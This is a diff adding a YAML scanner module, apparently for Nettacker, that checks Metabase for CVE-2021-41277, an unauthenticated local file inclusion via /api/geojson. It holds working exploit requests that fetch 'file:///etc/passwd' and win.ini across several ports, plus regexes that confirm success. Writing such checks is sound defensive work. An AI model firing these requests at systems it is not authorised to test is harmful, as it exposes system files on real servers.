@@ -1,0 +1,50 @@
+info:
+  name: metabase_cve_2021_41277_vuln
+  author: Syed Suzain
+  severity: 10
+  description: Metabase versions 0.40.0 to 0.40.4 (open-source) and 1.40.0 to 1.40.4 (enterprise) are vulnerable to unauthenticated Local File Inclusion via the /api/geojson endpoint. The url parameter is passed to the server file-fetching logic without scheme or path validation, allowing an attacker to read arbitrary files using a file:// URI. CISA KEV listed.
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-41277
+    - https://github.com/metabase/metabase/security/advisories/GHSA-w73v-6p7p-fpfr
+  profiles:
+    - vuln
+    - http
+    - critical_severity
+    - metabase
+    - lfi
+payloads:
+  - library: http
+    steps:
+      - method: get
+        timeout: 3
+        headers:
+          User-Agent: "{user_agent}"
+        allow_redirects: false
+        ssl: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/api/geojson?url={{lfi_paths}}"
+            prefix: ""
+            suffix: ""
+            interceptors: []
+            data:
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+                - 3000
+                - 8080
+              lfi_paths:
+                - "file:///etc/passwd"
+                - "file:///c:/windows/win.ini"
+        response:
+          condition_type: and
+          conditions:
+            status_code:
+              regex: "^200$"
+              reverse: false
+            content:
+              regex: "root:(\\S+):|\\[extensions\\]"
+              reverse: false
